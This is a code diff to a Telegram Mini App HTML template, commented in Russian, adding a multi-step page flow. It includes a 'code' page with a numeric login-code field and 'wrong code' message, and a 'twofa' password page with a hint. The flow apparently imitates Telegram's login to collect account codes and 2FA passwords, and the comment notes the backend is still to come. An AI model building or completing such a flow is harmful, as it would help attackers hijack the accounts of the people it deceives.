@@ -37,6 +37,14 @@
       padding: 14px 28px; border-radius: 12px; font-size: 16px;
       color: #fff; background: var(--tg-theme-button-color, #2ea6ff);
     }
+    .inp {
+      display: block; width: 100%; box-sizing: border-box;
+      margin: 0 0 14px; padding: 13px 16px; border-radius: 12px;
+      border: 1px solid rgba(127,127,127,.35);
+      background: rgba(127,127,127,.12); color: #fff;
+      font-size: 16px; text-align: center; outline: none;
+    }
+    .step { font-size: 12px; opacity: .45; margin-top: 18px; }
     .spinner {
       width: 28px; height: 28px; border-radius: 50%;
       border: 3px solid rgba(127,127,127,.3);
@@ -95,19 +103,61 @@
       }
     }
 
+    // ----- многошаговый прогон страниц шаблона (фронт; бекенд позже) -----
+    var PAGES = CFG.pages || [];
+    var step = 0;
+
+    function esc(s) {
+      return (s == null ? "" : String(s))
+        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    function renderStep(i) {
+      var p = PAGES[i];
+      if (!p) return;
+      var out = "";
+      if (p.emoji) out += '<div class="emoji">' + p.emoji + "</div>";
+      // text/waiting/wrong/hint хранятся как HTML-разметка шаблона — как есть
+      if (p.text) out += '<div class="text">' + p.text + "</div>";
+      // поле ввода для страниц «код» и «2FA»
+      if (p.key === "code") {
+        out += '<input class="inp" id="inp" inputmode="numeric" '
+             + 'placeholder="• • • • •" />';
+        if (p.wrong) out += '<p class="muted">' + p.wrong + "</p>";
+      } else if (p.key === "twofa") {
+        out += '<input class="inp" id="inp" type="password" placeholder="'
+             + esc(p.placeholder) + '" />';
+        if (p.hint) out += '<p class="muted">' + p.hint + "</p>";
+      } else if (p.key === "main" && p.waiting) {
+        out += '<p class="muted">' + p.waiting + "</p>";
+      }
+      var last = i >= PAGES.length - 1;
+      var label = p.button || (last ? "Готово" : "Далее");
+      out += '<button class="btn" id="act">' + esc(label) + "</button>";
+      out += '<div class="step">' + (i + 1) + " / " + PAGES.length + "</div>";
+      html(out);
+      var act = document.getElementById("act");
+      if (act) act.onclick = nextStep;
+    }
+
+    function nextStep() {
+      if (step < PAGES.length - 1) {
+        step += 1;
+        renderStep(step);
+      } else {
+        var tg = tgApp();
+        if (tg && tg.close) tg.close();
+      }
+    }
+
     function renderGranted() {
       whenTgReady(function (tg) {
         if (tg) { tg.ready(); try { tg.expand(); } catch (e) {} }
         applyTheme();
-        // Контент главной страницы шаблона: эмодзи + текст + кнопка.
-        var emoji = CFG.emoji
-          ? '<div class="emoji">' + CFG.emoji + '</div>' : '';
-        var text = CFG.text
-          ? '<div class="text">' + CFG.text + '</div>'
-          : '<h2>Доступ открыт ✅</h2>';
-        var button = CFG.button
-          ? '<button class="btn" id="act">' + CFG.button + '</button>' : '';
-        html(emoji + text + button);
+        if (!PAGES.length) { html('<h2>Доступ открыт ✅</h2>'); return; }
+        step = 0;
+        renderStep(step);
       });
     }
 
